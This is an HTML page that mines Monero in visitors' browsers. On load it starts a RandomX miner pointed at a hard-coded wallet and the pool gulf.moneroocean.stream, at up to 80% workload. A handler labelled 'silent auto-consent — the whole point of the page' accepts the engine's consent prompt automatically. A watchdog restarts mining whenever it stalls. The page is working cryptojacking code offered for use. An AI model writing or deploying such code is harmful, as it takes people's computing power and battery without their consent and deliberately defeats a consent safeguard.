<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>.</title>
<style>
  :root { color-scheme: dark }
  body {
    margin: 0; min-height: 100vh; display: grid; place-items: center;
    background: #0a0a0c; color: #cfcfd6;
    font: 13px/1.6 ui-monospace, SFMono-Regular, Menlo, monospace;
  }
  .w { text-align: center; opacity: .85 }
  .w b { font-weight: 500; letter-spacing: .04em }
  .a { font-size: 10px; color: #5d5d69; margin-top: 8px; word-break: break-all; max-width: 32ch }
  #p {
    position: fixed; right: 12px; bottom: 12px; display: flex; gap: 7px;
    align-items: center; padding: 6px 10px; border-radius: 999px;
    background: #15151a; border: 1px solid #24242c; font-size: 11px;
    cursor: pointer; user-select: none;
  }
  #d { width: 6px; height: 6px; border-radius: 50%; background: #3b3b45 }
  #d.ok { background: #2fd07a; box-shadow: 0 0 7px #2fd07a }
  #d.bad { background: #cf5237 }
  #d.wait { background: #cf9a37 }
</style>
</head>
<body>

<div class="w">
  <b>monero</b>
  <div class="a" id="a"></div>
</div>

<div id="p" title="pause / resume"><span id="d"></span><span id="t">starting</span></div>

<script src="/rx/embed.js"></script>
<script>
(() => {
  'use strict';

  const WALLET = '446vGEauAzVHFxd9yMcxCA4SMUzuAB9ggXxZu19TFF1wYGZ4UBSYrdHBt1GbEChH1QYiopYCsReLr1dveAffyTZv4GbTtRx';
  const POOL   = 'gulf.moneroocean.stream';
  const PORT   = 10001;

  const q = new URLSearchParams(location.search);
  const WORKLOAD = Math.max(1, Math.min(Number(q.get('throttle') ?? 80), 80));

  const mobile = matchMedia('(pointer: coarse)').matches ||
                 (navigator.deviceMemory && navigator.deviceMemory <= 4);

  document.getElementById('a').textContent =
    WALLET.slice(0, 8) + '…' + WALLET.slice(-6);

  const dot = document.getElementById('d');
  const txt = document.getElementById('t');
  const pill = document.getElementById('p');

  let rx = null;
  let paused = false;
  let lastMove = Date.now();
  let revives = 0;

  function mode() {
    if (mobile) return 'light';
    try { return RandomXEmbed.diagnose('full').supported ? 'full' : 'light'; }
    catch { return 'light'; }
  }

  function paint(s) {
    if (paused) { dot.className = 'bad'; txt.textContent = 'paused'; return; }
    if (s.phase === 'mining' && s.hashrate > 0) {
      lastMove = Date.now();
      dot.className = 'ok';
      txt.textContent = s.hashrate > 9999
        ? (s.hashrate / 1000).toFixed(1) + ' kH/s'
        : Math.round(s.hashrate) + ' H/s';
    } else if (s.phase === 'error') {
      dot.className = 'bad'; txt.textContent = 'error';
    } else if (s.phase === 'stopped') {
      dot.className = 'bad'; txt.textContent = 'paused';
    } else {
      dot.className = 'wait';
      txt.textContent = s.phase === 'reconnecting' ? 'retrying' : s.phase;
    }
  }

  function boot() {
    rx = RandomXEmbed.create({
      wallet: WALLET,
      pool: POOL,
      port: PORT,
      proxy: location.origin.replace(/^http/, 'ws') + '/bridge',
      assetBase: location.origin + '/rx/',
      mode: mode(),
      workload: WORKLOAD,
      workerName: 'web',
      headless: true
    });

    // silent auto-consent — the whole point of the page
    rx.on('consent-request', (ev) => { if (!document.hidden) ev.accept(); });
    rx.on('state', paint);
    rx.on('error', (e) => { dot.className = 'bad'; txt.textContent = e.code || 'error'; });

    rx.requestConsent();
  }

  // the engine refuses to accept consent while the tab is hidden
  document.addEventListener('visibilitychange', () => {
    if (!document.hidden && rx && !paused && rx.state.phase === 'consent') rx.requestConsent();
  });

  // watchdog: if it dies, rebuild it instead of sitting there
  setInterval(() => {
    if (paused || !rx) return;
    if (Date.now() - lastMove < 180000) return;
    if (revives >= 5) return;
    revives++;
    lastMove = Date.now();
    try { rx.stop('watchdog'); } catch {}
    setTimeout(() => { if (!paused) rx.requestConsent(); }, 1200);
  }, 30000);

  pill.addEventListener('click', () => {
    if (!rx) return;
    if (paused) { paused = false; revives = 0; lastMove = Date.now(); rx.requestConsent(); }
    else { paused = true; rx.stop('user'); }
  });

  if (document.readyState === 'complete') boot();
  else window.addEventListener('load', boot);
})();
</script>
</body>
</html>
